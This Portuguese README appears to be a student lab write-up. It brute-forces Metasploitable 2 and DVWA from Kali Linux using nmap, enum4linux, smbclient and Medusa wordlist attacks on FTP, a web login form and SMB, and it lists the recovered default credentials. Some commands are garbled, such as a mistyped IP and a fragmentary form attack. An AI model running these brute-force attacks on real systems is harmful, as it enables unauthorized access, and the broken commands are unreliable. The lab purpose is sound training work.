# README.md
//Explorando dentro do Virtual Box, utilizando o linux Kali e o Metasploit 2. Os ataques de REDES e suas vunerabilidades


|DOWLOAD 

 Abaixei o Virtual Box e consecutivamente, o Kali linux e o Metasploit 

Obs: mudei a configuração de REDE de ambos para (host,only).

|DE COMEÇO

Dentro do Metasploiot, me loguei com o login padrão. Sendo ele "msfadmin" o "user" quanto para a "senha".

 Assim; 
 Dei inicio colocando o código "ip a" para saber qual séria o meu ip. Deu 192.168.56.101.

  E iniciei o Kali Linux;

 Dentro do Kali Linux, eu me loguei e já abri o terminal para começar a codificar. 

ping -c 3 192.168.56.101

 Dando inicio a conexão.

Nmap -sV -p 21,22,80,445,139 192.168.56.101
  Mostrando como as portas estavam abertas e que estavam rodando de maneira correta. E quais versões cada uma das portas se situavam.

ftp 192.168.56.101.

 Para ver se o funcionamento está correto mas não tinha a senha , muito menos o login.

|CRIAÇÃO DOS USUÁRIOS + WORDLIST

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

Criando três documentos de texto, onde terá os usuários e o outro as senhas.

| UTILIZANDO,A MEDUSA

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp-t 6 

Ela então faz o processo de ataque de rede. Buscando o [SUCCESS]. O qual será o user e a senha que estamos procurando.

O meu caiu 
login: msfadmin
senha: msfadmin 
que corresponde a senha e o login do METAPLOIT 

| EXPLORANDO O DVWA

De primera não temos a senha nem o login. E precisamos descubrir,como funciona o ataque de rede . 

Com o  F12 indo de NETWORK e seguindo para o REQUEST dentro do próprio navegador .Temos acesso ao processo de segurança do site.

| DWA + MEDUSA 

DENTRO DO TERMINAL 
-m PAGE: '/dvwa/login.php'\
-m FORM: 'username =^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6 

Fazendo o mesmo tipo de ataque de rede, focado agora no DVWA. O que me deu acesso ao login e a password. Buscando novamente o [SUCESS]. Enfim descubrindo que o;

Login: admin
Senha: password

|SIMULANDO UM CENÁRIO CORPORATIVO

enum4linux -a 192.168.56.101 | tee enum4_output.txt

Mas o meu tinha dado erro e não tinha compreendido.Até que percebi que meu METASPLOIT estava desligado e irregular.Loguei novamente e recomecei meu código do zero.E assim, dei continuidade.

less enum4_output.txt

|CRIAÇÃO DE USUÁRIOS PT.2

echo -e "users\nmsfadmin\nservice" >smb_users.txt

echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt

medusa -h 1192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 

Fazendo o mesmo tipo de ataque de rede, focado no Cenário Corporativo . O que me deu acesso ao login e a password. Buscando novamente o [ACOUNT FOUND]. 

login: msfadmin
password : msfadmin

| CONFIRMANDO O ATAQUE 

smbclient -L //192.168.56.101 -U msfadmin

E assim pediu o "user" e a "password" e eu coloquei a que foi informada a mim.

login: msfadmin
password : msfadmin

O que confirmou que o meu ataque deu certo e foi feito de maneira bem sucedida.

